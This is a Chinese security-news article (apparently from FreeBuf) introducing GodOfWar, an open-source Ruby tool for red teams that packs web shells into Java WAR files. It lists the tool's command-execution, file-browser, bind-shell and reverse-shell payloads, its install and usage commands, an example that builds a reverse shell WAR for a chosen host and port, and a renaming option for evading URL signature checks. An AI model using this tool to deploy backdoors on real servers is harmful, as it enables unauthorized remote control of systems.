**今天给大家介绍的是一款名叫GodOfWar的开源Java WAR构建工具，在该工具的帮助下，研究人员可以轻松向Java
WAR包中嵌入恶意Payload。**

![GodOfWar：可嵌入恶意Payload的JavaWAR构建工具](https://image.3001.net/images/20190428/1556428522_5cc536ea56f2b.jpg!small)

GodOfWar采用Ruby开发，是一款专用于生成恶意WAR Payload的命令行工具，该工具仅限于渗透测试或红队研究使用。

![GodOfWar：可嵌入恶意Payload的JavaWAR构建工具](https://image.3001.net/images/20190428/1556428528_5cc536f017416.png!small)

## 功能介绍

1、 已嵌入的Payload（尝试命令-l/--list）

    
    
    -cmd_get
    -filebrowser
    -bind_shell
    -reverse_shell
    -reverse_shell_ui

2、可配置的后门（尝试命令--host/--port）

3、Payload名称控制

    
    
    -修改恶意Payload名称，绕过URL签名验证机制

## 工具安装

    
    
    $ gem install godofwar

## 工具使用

    
    
    $godofwar -h
     
    Helpmenu:
       -p, --payload PAYLOAD            利用已有Payload生成恶意WAR文件
                                            (check-l/--list)
       -H, --host IP_ADDR               设置指定Payload的本地或远程IP地址
                                            (used with -p/--payload)
       -P, --port PORT                  设置指定Payload的本地或远程端口号
                                            (usedwith -p/--payload)
       -o, --output [FILE]                输出文件并设置开发名称
                                            (default isthe payload original name. check '-l/--list')
       -l, --list                          枚举所有可用的Payload
       -h, --help                        显示帮助信息

## 使用样例

### 枚举所有Payload：

    
    
    $godofwar -l
    ├── cmd_get
    │   └── Information:
    │       ├── Description:Command execution via web interface
    │       ├── OS:          any
    │       ├── Settings:    {"false"=>"No Settingsrequired!"}
    │       ├── Usage:       http://host/cmd.jsp?cmd=whoami
    │       ├── References:  ["https://github.com/danielmiessler/SecLists/tree/master/Payloads/laudanum-0.8/jsp"]
    │       └── Local Path: /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/cmd_get
    ├── filebrowser
    │   └── Information:
    │       ├── Description: Remotefile browser, upload, download, unzip files and native command execution
    │       ├── OS:          any
    │       ├── Settings:    {"false"=>"No Settingsrequired!"}
    │       ├── Usage:       http://host/filebrowser.jsp
    │       ├── References: ["http://www.vonloesch.de/filebrowser.html"]
    │       └── Local Path: /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/filebrowser
    ├── bind_shell
    │   └── Information:
    │       ├── Description: TCPbind shell
    │       ├── OS:          any
    │       ├── Settings:    {"port"=>4444,"false"=>"No Settings required!"}
    │       ├── Usage:       http://host/reverse-shell.jsp
    │       ├── References:  ["Metasploit - msfvenom -pjava/jsp_shell_bind_tcp"]
    │       └── Local Path: /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/bind_shell
    ├── reverse_shell_ui
    │   └── Information:
    │       ├── Description: TCPreverse shell with a HTML form to set LHOST and LPORT from browser.
    │       ├── OS:          any
    │       ├── Settings:    {"host"=>"attacker","port"=>4444, "false"=>"No Settingsrequired!"}
    │       ├── Usage:       http://host/reverse_shell_ui.jsp
    │       ├── References:  []
    │       └── Local Path: /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/reverse_shell_ui
    ├── reverse_shell
    │   └── Information:
    │       ├── Description: TCPreverse shell. LHOST and LPORT are hardcoded
    │       ├── OS:          any
    │       ├── Settings:    {"host"=>"attacker","port"=>4444, "false"=>"No Settingsrequired!"}
    │       ├── Usage:       http://host/reverse_shell.jsp
    │       ├── References:  []
    │       └── Local Path: /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/reverse_shell

### 生成Payload并配置LHOST和LPORT：

    
    
    godofwar -p reverse_shell -H 192.168.100.10 -P 9911 -o puppy

开发完成之后，你可以进入(<http://host:8080/puppy/puppy.jsp>)来访问你的shell。

## 添加额外后门支持

1、 在payloads目录下创建一个新的文件夹。

2、 把自己开发的jsp文件存放到这个文件夹中。

3、 更新payloads_info.json文件中的下列参数：

> -文件描述
>
> -支持的操作系统（尽量覆盖所有操作系统）
>
> -配置信息：默认主机和端口号
>
> -引用：Payload的原始创建者信息

## 项目地址

GodOfWar：【[GitHub传送门](https://github.com/KINGSABRI/godofwar)】

### 许可证协议

本项目遵循[MIT开源许可证协议](http://opensource.org/licenses/MIT)。

 ***
参考来源：[godofwar](https://github.com/KINGSABRI/godofwar)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

